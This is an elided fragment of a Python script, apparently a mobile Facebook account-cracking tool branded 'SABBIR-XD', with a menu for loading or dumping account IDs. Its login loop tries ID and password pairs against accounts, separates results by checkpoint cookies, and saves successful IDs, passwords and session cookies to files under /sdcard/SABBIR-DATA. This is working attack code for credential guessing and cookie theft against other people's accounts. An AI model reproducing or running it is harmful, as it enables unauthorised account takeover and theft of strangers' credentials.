...
def DUMPING():
	...
	print('')
	print('        \x1b[38;5;210m[ 1 ] Craete File \033[1;37m[ SABBIR ] ')
	print('')
	print('        \x1b[38;5;211m[ 2 ] Craete File \033[1;37m[ SABBIR ] ')
	print('')
...
def menu():
	...
	print('')
	SALE = input('        \x1b[38;5;212m SABBIR = ')
	if SALE in ['1','01']:
		FILE()
	if SALE in ['2','02']:
		DUMPING()
...
def FILE():
	...
	banner()
	try:
		print('            \x1b[38;5;200mCreator \x1b[38;5;201m: \x1b[38;5;202mSABBIR ')
		print('            \x1b[38;5;200mAdmin\x1b[38;5;201m: \x1b[38;5;202mSABBIR ')
		print('            \x1b[38;5;200mGithub \x1b[38;5;201m: \x1b[38;5;202mRdx337 ')
		win = '# Enter File Path '
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/SABBIR-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SABBIR-XD CP'))
					open('/sdcard/SABBIR-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
